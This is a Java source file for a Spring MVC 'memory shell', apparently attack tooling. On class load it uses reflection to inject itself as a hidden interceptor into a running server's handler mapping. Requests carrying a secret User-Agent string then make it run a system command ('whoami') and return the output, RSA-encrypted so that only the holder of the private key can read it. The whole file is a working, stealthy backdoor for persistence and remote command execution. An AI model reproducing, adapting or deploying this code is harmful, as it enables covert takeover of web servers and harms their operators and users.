package org.springframework.sandbox.mvc;

import org.springframework.beans.BeansException;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;

import javax.crypto.Cipher;
import javax.servlet.ServletRequest;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.security.KeyFactory;
import java.security.interfaces.RSAPublicKey;
import java.security.spec.X509EncodedKeySpec;
import java.util.Scanner;


public class SpringInterceptor extends HandlerInterceptorAdapter {


    static {
        try {
            Class<?> RequestContextUtils = Class.forName("org.springframework.web.servlet.support.RequestContextUtils");

            Method getWebApplicationContext;
            try {
                getWebApplicationContext = RequestContextUtils.getDeclaredMethod("getWebApplicationContext", ServletRequest.class);
            } catch (NoSuchMethodException e) {
                getWebApplicationContext = RequestContextUtils.getDeclaredMethod("findWebApplicationContext", HttpServletRequest.class);
            }
            getWebApplicationContext.setAccessible(true);

            WebApplicationContext context = (WebApplicationContext) getWebApplicationContext.invoke(null, ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());

            //从requestMappingHandlerMapping中获取adaptedInterceptors属性 老版本是DefaultAnnotationHandlerMapping
            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping;
            try {
                Class<?> RequestMappingHandlerMapping = Class.forName("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping");
                abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(RequestMappingHandlerMapping);
            } catch (BeansException e) {
                Class<?> DefaultAnnotationHandlerMapping = Class.forName("org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping");
                abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(DefaultAnnotationHandlerMapping);
            }

            java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>) field.get(abstractHandlerMapping);


            //添加SpringInterceptorTemplate类到adaptedInterceptors
            adaptedInterceptors.add(new SpringInterceptor());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }


    public static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }


    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        try {
            String path = request.getRequestURI();

            HttpServletRequest req = request;
            if (req.getHeader("User-Agent").contains("Windows NT 10.0; Linux64")) {
                InputStream in = Runtime.getRuntime().exec("whoami").getInputStream();

                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";

                String publicKey = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCSPJ9ohMbyj46S9/9nQgD72OuPIVPSKpPhbfgTh+NwhzxyBVb8CXqMNoBcUTkMPJrz57/i/QkQv9OeY0HiOabWC3w2H0HULdPrQCTRCUVy6ag1Ed2gLtr9U5ZhkXeBabCOvIrHbsnTQWrR1yGT5YwPda1WL0EmVscLe8TSyvXViQIDAQAB";
                byte[] decoded = base64Decode(publicKey);
                RSAPublicKey pubKey = (RSAPublicKey) KeyFactory.getInstance("RSA").generatePublic(new X509EncodedKeySpec(decoded));
                Cipher cipher = Cipher.getInstance("RSA");
                cipher.init(Cipher.ENCRYPT_MODE, pubKey);
                String outStr = base64Encode(cipher.doFinal(output.getBytes("UTF-8")));
                response.getWriter().write(outStr);
                return false;
            }

            if (path.contains("/hello") || path.startsWith("/json") || path.startsWith("/shell")) {
                return false;
            }

            // 入口
        } catch (Exception e) {
            // e.printStackTrace();
        }

        return true;
    }


}
